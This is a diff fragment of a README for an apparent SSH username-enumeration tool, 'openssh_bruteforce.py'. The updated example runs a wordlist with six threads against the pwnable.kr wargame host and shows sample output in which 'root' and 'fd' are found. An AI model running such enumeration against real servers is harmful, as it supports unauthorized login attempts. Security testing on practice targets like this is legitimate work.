@@ -21,8 +21,20 @@ required arguments:
 ```
 example 
 ```
-$ ./openssh_bruteforce.py -host pwnable.kr -user fd -p 2222
-[+] User Exists!
+$ ./openssh_bruteforce.py -host pwnable.kr -w test.txt -p 2222 -t 6
+[+] Starting bruteforce with 6 threads..
+[!] Testing user  root
+[!] Testing user  hthgfbngc
+[!] Testing user  fsdfsdgfsd
+[!] Testing user  bfgbnrtbfgb
+[!] Testing user  bcf
+[!] Testing user  ffgbcfbcf
+[+] Found user  root
+[!] Testing user  fd
+[!] Testing user  no
+[+] Found user  fd
+Found Users:  ['fd', 'root']
+
 ```
 
 # Note
